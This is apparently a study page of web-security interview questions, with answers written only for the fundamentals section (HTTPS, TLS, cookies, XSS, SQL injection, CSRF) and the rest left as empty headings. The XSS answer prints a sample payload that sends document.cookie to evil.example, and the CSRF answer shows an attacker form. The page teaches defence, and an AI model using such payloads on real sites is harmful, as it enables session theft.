# Web security — Interview

Answers are filled for the published subset; the rest are still empty.

[← Back to hub](./7_special.md)

### Related docs

- [Web security](./7_special_security.md) · [Web security — Interview](./7_special_security_interview.md)

### Sections

- [Interview Practice](#interview-practice)

---

## Interview Practice

Questions from [Devinterview.io — Web Security](https://devinterview.io/questions/web-and-mobile-development/web-security-interview-questions/).

### Web Security Fundamentals

<details>
<summary>What is web security, and why is it important?</summary>

### What is web security, and why is it important?

**Definition:**

Web security is the set of controls that keep a site’s data confidential, intact, and available to the people who are allowed to use it.

**How it works:**

- Confidentiality means only authorized parties can read the data. Integrity means they can detect a change. Availability means the service is up when it should be.
- TLS encrypts the transport and lets the client check the server’s identity.
- Authentication establishes who the caller is. Authorization decides what that caller may do.
- Response headers narrow what the browser will do: `X-Content-Type-Options: nosniff` stops MIME sniffing, `X-Frame-Options` or CSP `frame-ancestors` stops framing, and `Content-Security-Policy` limits where scripts may load from. The old `X-XSS-Protection` header is retired. Do not rely on it.
- Treat every request body, query string, and header as data. Encode it on output, and send queries with parameters so user text cannot become SQL or HTML.
- State-changing requests need a CSRF token the attacker’s page cannot read. Session cookies need `Secure`, `HttpOnly`, and a sensible `SameSite`, and the session id should change when the user signs in.

**Examples:**

```text
Strict-Transport-Security: max-age=63072000
X-Content-Type-Options: nosniff
Content-Security-Policy: default-src 'self'
X-Frame-Options: DENY
```

</details>

<details>
<summary>Can you explain what HTTPS is and how it differs from HTTP?</summary>

### Can you explain what HTTPS is and how it differs from HTTP?

**Definition:**

HTTPS is HTTP inside TLS. The request and response have the same shape as HTTP, and the bytes on the wire are encrypted and checked.

**How it works:**

- TLS provides encryption, a certificate the client can validate, and an integrity check on each record.
- HTTP is cleartext and conventionally uses port 80. HTTPS uses port 443. Browsers mark plain HTTP as not secure, and HTTPS is what you want for anything that is not a toy.
- The handshake agrees a TLS version and a cipher suite, checks the certificate against a trusted authority, and derives fresh traffic keys. Modern suites use ephemeral Diffie-Hellman, so a later theft of the server’s private key does not decrypt old sessions.
- A certificate authority issues the certificate. The public-key infrastructure is the set of authorities, certificates, and revocation data browsers trust.
- The extra round trips cost a little latency. Session resumption and HTTP/2 make up much of that on later requests.

**Examples:**

```text
http://shop.example/cart    cleartext, port 80
https://shop.example/cart   TLS, port 443
```

</details>

<details>
<summary>What are SSL and TLS, and what role do they play in web security?</summary>

### What are SSL and TLS, and what role do they play in web security?

**Definition:**

SSL and TLS are protocols that wrap a connection so the two ends can authenticate, encrypt, and detect tampering. TLS is the protocol you deploy. SSL 2.0 and 3.0 are obsolete and must be disabled.

**How it works:**

- The server presents a certificate. The client checks the name, the dates, and the chain up to a trust anchor.
- After the handshake, traffic uses symmetric encryption such as AES. Public-key operations are used to authenticate and to agree the symmetric key, because they are slower.
- A hash such as SHA-256 is part of the integrity construction. A changed byte fails the check and the connection stops.
- Forward secrecy is a property of suites that use a fresh ephemeral key (ECDHE). It is not automatic in every historical cipher suite. RC4 and other broken algorithms are not acceptable.
- TLS 1.2 and 1.3 are the versions to allow. The handshake negotiates downward only as far as you configured, so disable the old versions rather than hoping the client will choose well.

**Examples:**

A browser lock icon means the certificate checked out and the requests on that page are using TLS. It does not mean the application is free of injection bugs.

</details>

<details>
<summary>How do SSL certificates work, and what is the purpose of a Certificate Authority (CA)?</summary>

### How do SSL certificates work, and what is the purpose of a Certificate Authority (CA)?

**Definition:**

An SSL/TLS certificate binds a public key to a name. A certificate authority signs that binding so a browser can trust it without having met the server before.

**How it works:**

- The handshake agrees algorithms and derives traffic keys. The certificate is how the client knows the public key belongs to the name in the URL.
- The authority checks the requester’s control of the name (and, for stricter certificates, the organization), signs the certificate, and can later revoke it.
- A certificate carries the issuer, the validity window, the subject (the name), the public key, and the issuer’s signature over those fields.
- PEM is the Base64 text form you paste into configs. DER is the binary encoding of the same structure.
- A self-signed certificate is signed by its own key. It is fine for a local test and useless for public users, because their browsers do not trust you. A publicly trusted certificate comes from an authority already in the browser’s trust store.

**Examples:**

```text
subject: shop.example
issuer: Example CA
public key: (server key)
not after: 2027-04-01
signature: signed by Example CA
```

</details>

<details>
<summary>What is the difference between encryption and hashing?</summary>

### What is the difference between encryption and hashing?

**Definition:**

Encryption is reversible if you have the key. Hashing is one-way: it maps data to a fixed-length digest, and you cannot recover the input from the digest.

**How it works:**

- Encrypt when someone who holds the key must read the data later: a message, a disk, a TLS record.
- Hash when you need to detect a change or to store a password check without storing the password. Verification hashes the new input and compares digests.
- A password store uses a slow, salted password hash (bcrypt, scrypt, or Argon2), not a fast checksum such as plain SHA-256.
- The same input and key always produce the same ciphertext. A hash of equal inputs matches. A one-bit change in the input should change the digest widely.

**Examples:**

```text
encrypt("invoice 42", key) → ciphertext that decrypt(key) turns back
hash("invoice 42")         → digest you can compare, not decrypt
```

</details>

<details>
<summary>Define the concept of a secure session and explain how it is established.</summary>

### Define the concept of a secure session and explain how it is established.

**Definition:**

A secure session is a stretch of requests the server treats as one authenticated user, protected so an outsider cannot read it or forge the next request.

**How it works:**

- On the wire, TLS agrees traffic keys for that connection. Modern handshakes derive them with ephemeral Diffie-Hellman. The server proves its name with a certificate. The client’s public key is not what encrypts a session key. Older RSA key transport did encrypt a premaster secret to the server’s public key, and that mode is obsolete.
- The keys must be unpredictable and long enough. AES-128 is a common floor for the traffic key. A fresh ephemeral key gives forward secrecy: compromising the server’s long-term key later does not open this session.
- In the application, the server stores the user’s state and sends only a random session id, usually in a cookie. Regenerating that id at login closes fixation. A separate CSRF token, or a `SameSite` cookie plus a custom header, stops another site from riding the session.
- Short-lived tokens are the same idea in APIs: the token names the grant, and it expires.

**Examples:**

```text
Set-Cookie: sid=8f3c…; Secure; HttpOnly; SameSite=Lax
```

The browser stores `sid`. JavaScript cannot read it. The server looks `sid` up and finds the user.

</details>

<details>
<summary>What are some common web security vulnerabilities?</summary>

### What are some common web security vulnerabilities?

**Definition:**

The weaknesses that show up again and again are injection, cross-site scripting, broken authentication, misconfiguration, insecure object references, cross-site request forgery, and open redirects.

**How it works:**

- SQL injection happens when user text is concatenated into a query. `1 OR 1=1` changes the condition. Send the value as a parameter, or let a query builder do that. Do not assemble SQL by joining strings.
- XSS happens when user text is written into HTML or JavaScript without encoding, so `<script>` runs in a victim’s browser. Encode on output for the context, and set a Content Security Policy.
- Broken authentication is guessable passwords, session ids in URLs, or a session that never rotates. Store a slow password hash, and set `HttpOnly` and `Secure` on the session cookie.
- Misconfiguration is a default admin password, a stack trace in production, or a storage bucket left public. Review the deployed settings and grant the least privilege that works.
- An insecure direct object reference is `/invoices/42` with no check that this user owns invoice 42. Authorize the object, and do not treat the id as a secret.
- CSRF is a site the victim visits, causing the victim’s browser to send the victim’s cookies to your site. Require a token on state-changing requests.
- An open redirect sends the browser to whatever URL arrived in a parameter. Allow only relative paths or a fixed list of hosts.

**Examples:**

```text
GET /invoices/42          must check the caller owns 42
GET /next?url=https://evil.example   must not redirect there
```

</details>

<details>
<summary>Can you explain the Cross-Site Scripting (XSS) attack and how to prevent it?</summary>

### Can you explain the Cross-Site Scripting (XSS) attack and how to prevent it?

**Definition:**

Cross-site scripting runs an attacker’s script in a victim’s browser, in the origin of a site that trusted the attacker’s text.

**How it works:**

- The script can read the DOM, act as the user, rewrite the page, or send the user somewhere else. A cookie marked `HttpOnly` is not readable from that script. A cookie without the flag is.
- Stored XSS saves the payload, for example in a comment, and runs it for everyone who opens the page. Reflected XSS returns the payload in the response to the request that carried it. DOM XSS is assembled by client-side code from a URL or another browser input.
- The durable fix is output encoding for the context: HTML text, an attribute, or JavaScript are not the same encoding. A Content Security Policy that does not allow inline scripts limits what a missed encoding can do.
- Validate input when you know the shape (an integer, a date). Validation is not a substitute for encoding. `HttpOnly` and `Secure` on cookies shrink the payoff.
- Review places where HTML is built from data. Do not execute untrusted markup in order to “see what it does” outside a sandbox.

**Examples:**

```text
comment: <script>fetch('https://evil.example/?c='+document.cookie)</script>
```

Stored as text and inserted with the HTML escaped, the browser shows the tags. Inserted as HTML, it runs.

</details>

<details>
<summary>What is SQL Injection and how can you defend against it?</summary>

### What is SQL Injection and how can you defend against it?

**Definition:**

SQL injection is user input that the database executes as SQL, because the application glued that input into the statement text.

**How it works:**

- The usual entry is a form field or a query parameter. The attacker closes the intended condition and adds their own, to read rows, change them, or run a second statement where the engine allows it.
- A parameterized statement, or prepared statement, keeps the SQL text fixed and sends the value separately. The engine never parses the value as syntax.
- A stored procedure helps only if it also receives parameters. A procedure that concatenates a string internally is still injectable.
- An ORM or query builder is safe when you use its parameter API. It is not safe when you pass it a raw fragment.
- Rejecting unexpected characters is a backup. It is not the control you depend on, because a missed character class is a bypass.

**Examples:**

```python
# the value cannot change the statement
cursor.execute(
    "SELECT id FROM invoices WHERE customer_id = %s",
    (customer_id,),
)
```

</details>

<details>
<summary>Describe what Cross-Site Request Forgery (CSRF) is and how to prevent it.</summary>

### Describe what Cross-Site Request Forgery (CSRF) is and how to prevent it.

**Definition:**

Cross-site request forgery makes a victim’s browser send a state-changing request to a site where the victim is already signed in. The browser attaches the cookies. The victim did not mean to send the request.

**How it works:**

- The victim opens the attacker’s page while a session cookie for your site is still stored. The page submits a form, or loads a URL, aimed at your site. The same-origin policy does not stop that request. It stops the attacker’s script from reading the response.
- The synchronizer token is a random value in the form or header that the server checks. The attacker’s page cannot read it from your origin, so it cannot supply a matching token.
- A cookie that is not the session cookie, echoed back in a header (double submit), is the same idea when script on your origin can read that cookie and script on the other origin cannot.
- `SameSite=Lax` or `Strict` stops many cross-site cookie submissions. It is not a complete substitute for a token on APIs that other sites are meant to call.
- Ask the user to confirm an irreversible action. Serve the site only over HTTPS so the cookie is not stolen on the way, which is a different problem.

**Examples:**

```html
<!-- on evil.example, while the victim is signed in at shop.example -->
<form action="https://shop.example/transfer" method="POST">
  <input name="to" value="attacker">
</form>
```

The form needs a token the attacker cannot see, or the cookie must not be sent on this cross-site POST.

</details>

<details>
<summary>Explain the Same-Origin Policy and its importance in web security.</summary>

### Explain the Same-Origin Policy and its importance in web security.

**Definition:**

The same-origin policy is the browser rule that a document may freely read another document only when the protocol, host, and port all match.

**How it works:**

- `https://shop.example` and `https://shop.example` match. `http://shop.example`, `https://other.example`, and `https://shop.example:8443` do not.
- Because of that, a malicious page cannot read your account page or your response bodies just because both tabs are open.
- It limits what a script can do with another origin. It does not by itself stop that origin from receiving a request, which is why CSRF still needs a token.
- Cookies are not sent to a different host, so one origin does not receive another origin’s session cookie. That is separate from XSS on the origin that owns the cookie.
- CORS is how a server opts in to specific cross-origin reads. An iframe can embed another page, and the parent still cannot read the frame’s document unless the origins match.
- Subdomains are different hosts. Older browsers were less consistent. Systems that are meant to be called from many web origins have to say so explicitly. They do not get a free pass.

**Examples:**

```text
https://shop.example/app  and  https://shop.example/api   same origin
https://shop.example      and  https://cdn.shop.example   different hosts
```

</details>

<details>
<summary>What is Clickjacking, and what measures can prevent it?</summary>

### What is Clickjacking, and what measures can prevent it?

**Definition:**

Clickjacking is a page that frames your site, hides the frame, and lines your buttons up under something the user meant to click.

**How it works:**

- A transparent iframe, or a positioned layer, sits over a harmless-looking control. The click lands on your framed page.
- Drag-and-drop variants trick the user into moving data onto the attacker’s target.
- Send `Content-Security-Policy: frame-ancestors 'none'`, or `'self'` if you frame yourself. `X-Frame-Options: DENY` (or `SAMEORIGIN`) is the older header that still helps where CSP is ignored.
- A frame-busting script that navigates the top window away is a weak backup. It fails when scripting is restricted, and the header is the control that works with scripts off.
- The pointer-lock API is not a clickjacking defense.

**Examples:**

```text
Content-Security-Policy: frame-ancestors 'none'
X-Frame-Options: DENY
```

</details>

<details>
<summary>How can web cookies compromise security, and how do you safeguard against these risks?</summary>

### How can web cookies compromise security, and how do you safeguard against these risks?

**Definition:**

A cookie becomes a security problem when stealing it, reading it from script, or stuffing it with sensitive data lets someone else act as the user.

**How it works:**

- Session hijacking is the use of a stolen session id. Mark the cookie `Secure` so it is only sent over HTTPS, and `HttpOnly` so page script cannot read it. Issue a new id when the user authenticates, and expire idle sessions.
- XSS is the usual way script steals a cookie that lacks `HttpOnly`. Encoding output and a Content Security Policy are the fixes. The cookie flags only limit the damage.
- Do not put passwords, personal data, or authorization decisions in the cookie. Store a random id and keep the data on the server. If you must put a value in the cookie, sign it or encrypt it and treat the client as able to see it anyway if script can read it.
- The `__Host-` prefix requires `Secure`, a path of `/`, and no `Domain`, so a subdomain cannot plant the cookie. `__Secure-` requires `Secure`.

**Examples:**

```text
Set-Cookie: __Host-sid=8f3c…; Secure; HttpOnly; Path=/; SameSite=Lax
```

</details>

<details>
<summary>What is a Man-in-the-Middle (MitM) attack and how can it be prevented?</summary>

### What is a Man-in-the-Middle (MitM) attack and how can it be prevented?

**Definition:**

A man-in-the-middle attack is someone on the path between two parties who reads or changes the traffic and, if the parties do not authenticate each other, pretends to be one of them.

**How it works:**

- Open Wi-Fi, a spoofed site, and a tampered mail path are common places this happens.
- TLS with a checked certificate closes the web case: the attacker does not have a certificate for your name that the client’s trust store accepts, so the handshake fails.
- HSTS tells the browser to use HTTPS for your host even when a link says HTTP, which blocks a downgrade. Certificate pinning, mostly in native apps, refuses any certificate other than the ones you shipped.
- On the local network, 802.1X authenticates devices before they get access, and WPA2 or WPA3 protects the wireless link. An intrusion detection or prevention system watches for the odd traffic that remains.
- A lock icon you trained users to ignore, or a certificate warning you trained them to click through, undoes the protocol.

**Examples:**

```text
Strict-Transport-Security: max-age=63072000; includeSubDomains
```

After the first HTTPS visit, the browser refuses a cleartext retry of that host.

</details>

<details>
<summary>Describe the concept of session management in web security.</summary>

### Describe the concept of session management in web security.

**Definition:**

Session management is how a server remembers a user across HTTP requests, which are otherwise independent, and how it stops someone else from using that memory.

**How it works:**

- The server keeps the data. The client keeps only an identifier. Cookies are the usual carrier. Putting the id in the URL, in a hidden form field, or in a custom header leaks it into logs, referrers, or script.
- The identifier must be long and random. Predictable ids are session prediction.
- Hijacking uses a stolen id. Fixation plants an id the attacker already knows and waits for the victim to sign in on it. Regenerating the id at login closes fixation.
- CSRF rides a real session. A token or `SameSite` addresses that. A loose CORS configuration that reflects any origin and allows credentials lets another site read authenticated responses.
- Use TLS, set `Secure` and `HttpOnly`, expire idle sessions, and check the session on the server for every protected action. A weak TLS configuration undermines the cookie flags.

**Examples:**

```text
sign-in succeeds
  → discard the anonymous sid
  → Set-Cookie: sid=<new random>; Secure; HttpOnly; SameSite=Lax
idle 30 minutes
  → forget that sid on the server
```

</details>


### Authentication and Authorization

<details>
<summary>What is the difference between authentication and authorization?</summary>

### What is the difference between authentication and authorization?

**Definition:**

</details>

<details>
<summary>Explain basic authentication and its weaknesses.</summary>

### Explain basic authentication and its weaknesses.

**Definition:**

</details>

<details>
<summary>What is OAuth, and how does it work?</summary>

### What is OAuth, and how does it work?

**Definition:**

</details>

<details>
<summary>What is OpenID and how does it relate to web security?</summary>

### What is OpenID and how does it relate to web security?

**Definition:**

</details>

<details>
<summary>Can you describe Multi-Factor Authentication (MFA) and where it's used?</summary>

### Can you describe Multi-Factor Authentication (MFA) and where it's used?

**Definition:**

</details>

<details>
<summary>What is JWT (JSON Web Tokens) and how are they used in authentication?</summary>

### What is JWT (JSON Web Tokens) and how are they used in authentication?

**Definition:**

</details>

<details>
<summary>How do you securely store user passwords?</summary>

### How do you securely store user passwords?

**Definition:**

</details>

<details>
<summary>What is Single Sign-On (SSO) and what are its benefits?</summary>

### What is Single Sign-On (SSO) and what are its benefits?

**Definition:**

</details>

<details>
<summary>Explain role-based access control (RBAC) and how it is implemented.</summary>

### Explain role-based access control (RBAC) and how it is implemented.

**Definition:**

</details>

<details>
<summary>What are the best practices for handling user session timeouts?</summary>

### What are the best practices for handling user session timeouts?

**Definition:**

</details>


### Network Security Concerns

<details>
<summary>What is a firewall, and how does it contribute to web security?</summary>

### What is a firewall, and how does it contribute to web security?

**Definition:**

</details>

<details>
<summary>Define a Virtual Private Network (VPN) and its significance in enhancing web security.</summary>

### Define a Virtual Private Network (VPN) and its significance in enhancing web security.

**Definition:**

</details>

<details>
<summary>What is an Intrusion Detection System (IDS) vs. an Intrusion Prevention System (IPS)?</summary>

### What is an Intrusion Detection System (IDS) vs. an Intrusion Prevention System (IPS)?

**Definition:**

</details>

<details>
<summary>How does a Distributed Denial-of-Service (DDoS) attack work, and how can websites be protected from it?</summary>

### How does a Distributed Denial-of-Service (DDoS) attack work, and how can websites be protected from it?

**Definition:**

</details>

<details>
<summary>Explain the concept of a Content Delivery Network (CDN) and its importance in web security.</summary>

### Explain the concept of a Content Delivery Network (CDN) and its importance in web security.

**Definition:**

</details>


### Secure Coding Practices

<details>
<summary>What are secure coding practices, and why are they needed?</summary>

### What are secure coding practices, and why are they needed?

**Definition:**

</details>

<details>
<summary>How can input validation prevent web security threats?</summary>

### How can input validation prevent web security threats?

**Definition:**

</details>

<details>
<summary>What are parameterized queries, and how do they prevent SQL injection?</summary>

### What are parameterized queries, and how do they prevent SQL injection?

**Definition:**

</details>

<details>
<summary>Why should developers avoid security through obscurity?</summary>

### Why should developers avoid security through obscurity?

**Definition:**

</details>

<details>
<summary>How do you securely handle file uploads to prevent web security issues?</summary>

### How do you securely handle file uploads to prevent web security issues?

**Definition:**

</details>


### Data Protection and Privacy

<details>
<summary>Define Personally Identifiable Information (PII) and discuss how it should be protected.</summary>

### Define Personally Identifiable Information (PII) and discuss how it should be protected.

**Definition:**

</details>

<details>
<summary>What is the General Data Protection Regulation (GDPR), and what are its key tenets?</summary>

### What is the General Data Protection Regulation (GDPR), and what are its key tenets?

**Definition:**

</details>

<details>
<summary>What are data encryption best practices for sensitive information?</summary>

### What are data encryption best practices for sensitive information?

**Definition:**

</details>

<details>
<summary>Explain data masking and how it can protect sensitive data.</summary>

### Explain data masking and how it can protect sensitive data.

**Definition:**

</details>

<details>
<summary>What steps can organizations take to ensure data privacy?</summary>

### What steps can organizations take to ensure data privacy?

**Definition:**

</details>


### Advanced Web Security Concepts

<details>
<summary>What are security headers, and why are they important?</summary>

### What are security headers, and why are they important?

**Definition:**

</details>

<details>
<summary>What is Content Security Policy (CSP) and how does it improve web security?</summary>

### What is Content Security Policy (CSP) and how does it improve web security?

**Definition:**

</details>

<details>
<summary>Can you explain the role of Subresource Integrity (SRI) in web security?</summary>

### Can you explain the role of Subresource Integrity (SRI) in web security?

**Definition:**

</details>

<details>
<summary>What is Domain Name System Security Extensions (DNSSEC), and how does it work?</summary>

### What is Domain Name System Security Extensions (DNSSEC), and how does it work?

**Definition:**

</details>

<details>
<summary>What is HTTP Strict Transport Security (HSTS) and how can it be used?</summary>

### What is HTTP Strict Transport Security (HSTS) and how can it be used?

**Definition:**

</details>


### Security Testing and Audits

<details>
<summary>What is penetration testing, and how does it differ from vulnerability scanning?</summary>

### What is penetration testing, and how does it differ from vulnerability scanning?

**Definition:**

</details>

<details>
<summary>How is fuzzing used in security testing?</summary>

### How is fuzzing used in security testing?

**Definition:**

</details>

<details>
<summary>What are the main objectives of a security audit?</summary>

### What are the main objectives of a security audit?

**Definition:**

</details>

<details>
<summary>Can you explain the concept of threat modeling?</summary>

### Can you explain the concept of threat modeling?

**Definition:**

</details>

<details>
<summary>What is static code analysis and how it is beneficial in identifying security risks?</summary>

### What is static code analysis and how it is beneficial in identifying security risks?

**Definition:**

</details>


### Compliance and Standards

<details>
<summary>What are some common web security compliance standards?</summary>

### What are some common web security compliance standards?

**Definition:**

</details>

<details>
<summary>Explain the purpose and key aspects of ISO/IEC 27001.</summary>

### Explain the purpose and key aspects of ISO/IEC 27001.

**Definition:**

</details>

<details>
<summary>What is PCI DSS and its relevance to web security?</summary>

### What is PCI DSS and its relevance to web security?

**Definition:**

</details>

<details>
<summary>Can you discuss the importance of HIPAA compliance in web applications?</summary>

### Can you discuss the importance of HIPAA compliance in web applications?

**Definition:**

</details>


### Emerging Threats and Trends

<details>
<summary>How do you stay informed about the latest web security threats?</summary>

### How do you stay informed about the latest web security threats?

**Definition:**

</details>

<details>
<summary>Can you discuss the implications of quantum computing on web security?</summary>

### Can you discuss the implications of quantum computing on web security?

**Definition:**

</details>

<details>
<summary>What role does artificial intelligence play in web security?</summary>

### What role does artificial intelligence play in web security?

**Definition:**

</details>

<details>
<summary>How can Internet of Things (IoT) devices create web security risks?</summary>

### How can Internet of Things (IoT) devices create web security risks?

**Definition:**

</details>

<details>
<summary>What is Zero Trust security architecture?</summary>

### What is Zero Trust security architecture?

**Definition:**

</details>


### Incident Response and Handling

<details>
<summary>What is an incident response plan, and why is it critical?</summary>

### What is an incident response plan, and why is it critical?

**Definition:**

</details>

<details>
<summary>Explain the steps you would take after discovering a data breach.</summary>

### Explain the steps you would take after discovering a data breach.

**Definition:**

</details>

<details>
<summary>How important is user training in preventing web security incidents?</summary>

### How important is user training in preventing web security incidents?

**Definition:**

</details>

<details>
<summary>Can you discuss the role of a Security Operations Center (SOC)?</summary>

### Can you discuss the role of a Security Operations Center (SOC)?

**Definition:**

</details>


### Cloud Security

<details>
<summary>How does web security change when applications are moved to the cloud?</summary>

### How does web security change when applications are moved to the cloud?

**Definition:**

</details>

<details>
<summary>What are the shared responsibility models in cloud security?</summary>

### What are the shared responsibility models in cloud security?

**Definition:**

</details>

<details>
<summary>Explain how encryption is handled in the cloud.</summary>

### Explain how encryption is handled in the cloud.

**Definition:**

</details>

<details>
<summary>What special considerations are there for web security with cloud storage services?</summary>

### What special considerations are there for web security with cloud storage services?

**Definition:**

</details>

<details>
<summary>How does a Web Application Firewall (WAF) protect cloud-hosted web applications?</summary>

### How does a Web Application Firewall (WAF) protect cloud-hosted web applications?

**Definition:**

</details>


### Security in Web Application Frameworks

<details>
<summary>What built-in security features do modern web application frameworks typically include?</summary>

### What built-in security features do modern web application frameworks typically include?

**Definition:**

</details>

<details>
<summary>How does Ruby on Rails handle web security, and what are its built-in protection mechanisms?</summary>

### How does Ruby on Rails handle web security, and what are its built-in protection mechanisms?

**Definition:**

</details>

<details>
<summary>What are the security features provided by Django for Python web applications?</summary>

### What are the security features provided by Django for Python web applications?

**Definition:**

</details>

<details>
<summary>How does ASP.NET Core enforce web security?</summary>

### How does ASP.NET Core enforce web security?

**Definition:**

</details>

<details>
<summary>What security considerations must be taken into account when using client-side JavaScript frameworks like Angular, React, or Vue.js?</summary>

### What security considerations must be taken into account when using client-side JavaScript frameworks like Angular, React, or Vue.js?

**Definition:**

</details>


### Mobile Web Security

<details>
<summary>How do mobile web applications pose unique security challenges?</summary>

### How do mobile web applications pose unique security challenges?

**Definition:**

</details>

<details>
<summary>What steps can be taken to secure mobile APIs and services?</summary>

### What steps can be taken to secure mobile APIs and services?

**Definition:**

</details>

<details>
<summary>Discuss the security implications of third-party libraries in mobile web app development.</summary>

### Discuss the security implications of third-party libraries in mobile web app development.

**Definition:**

</details>

<details>
<summary>What are common vulnerabilities found in mobile web applications?</summary>

### What are common vulnerabilities found in mobile web applications?

**Definition:**

</details>


### Secure Infrastructure

<details>
<summary>How does server hardening affect web security?</summary>

### How does server hardening affect web security?

**Definition:**

</details>

<details>
<summary>Explain the importance of patch management in maintaining web security.</summary>

### Explain the importance of patch management in maintaining web security.

**Definition:**

</details>

<details>
<summary>What is network segmentation, and how can it improve security for web applications?</summary>

### What is network segmentation, and how can it improve security for web applications?

**Definition:**

</details>

<details>
<summary>Describe how load balancers can be configured to improve web application security.</summary>

### Describe how load balancers can be configured to improve web application security.

**Definition:**

</details>


### Cryptography in Web Security

<details>
<summary>What is the difference between symmetric and asymmetric encryption, and how are they used in web security?</summary>

### What is the difference between symmetric and asymmetric encryption, and how are they used in web security?

**Definition:**

</details>

<details>
<summary>Explain the role of digital signatures in maintaining web security.</summary>

### Explain the role of digital signatures in maintaining web security.

**Definition:**

</details>

<details>
<summary>What is a cryptographic hash function, and where is it used in web security?</summary>

### What is a cryptographic hash function, and where is it used in web security?

**Definition:**

</details>

<details>
<summary>How can Public Key Infrastructure (PKI) be used to secure web applications?</summary>

### How can Public Key Infrastructure (PKI) be used to secure web applications?

**Definition:**

</details>


### DevSecOps and Web Security

<details>
<summary>How does DevSecOps integrate security into the web development lifecycle?</summary>

### How does DevSecOps integrate security into the web development lifecycle?

**Definition:**

</details>

<details>
<summary>What are security Information and Event Management (SIEM) systems and their role in web security?</summary>

### What are security Information and Event Management (SIEM) systems and their role in web security?

**Definition:**

</details>

<details>
<summary>How can containerization improve web security?</summary>

### How can containerization improve web security?

**Definition:**

</details>

<details>
<summary>Discuss the role of automated security pipelines in web application deployments.</summary>

### Discuss the role of automated security pipelines in web application deployments.

**Definition:**

</details>


### API and Web Service Security

<details>
<summary>What are the primary concerns for REST API security?</summary>

### What are the primary concerns for REST API security?

**Definition:**

</details>

<details>
<summary>How does OAuth 2.0 provide secure delegated access?</summary>

### How does OAuth 2.0 provide secure delegated access?

**Definition:**

</details>

<details>
<summary>What are best practices for securing GraphQL APIs?</summary>

### What are best practices for securing GraphQL APIs?

**Definition:**

</details>

<details>
<summary>How can webhooks be secured to ensure they are not exploited?</summary>

### How can webhooks be secured to ensure they are not exploited?

**Definition:**

</details>

<details>
<summary>Explain the significance of rate limiting in API security.</summary>

### Explain the significance of rate limiting in API security.

**Definition:**

</details>


### Web Security Culture and Policy

<details>
<summary>How do you foster a culture of security within a web development team?</summary>

### How do you foster a culture of security within a web development team?

**Definition:**

</details>

<details>
<summary>What should a web security policy include?</summary>

### What should a web security policy include?

**Definition:**

</details>

<details>
<summary>Discuss the process of conducting a security risk assessment for web applications.</summary>

### Discuss the process of conducting a security risk assessment for web applications.

**Definition:**

</details>

<details>
<summary>How does change management impact web security?</summary>

### How does change management impact web security?

**Definition:**

</details>

<details>
<summary>Why should a company have an established data breach response protocol?</summary>

### Why should a company have an established data breach response protocol?

**Definition:**

</details>


### Miscellaneous Web Security

<details>
<summary>What is the Secure Development Lifecycle (SDL) and its relevance to web security?</summary>

### What is the Secure Development Lifecycle (SDL) and its relevance to web security?

**Definition:**

</details>
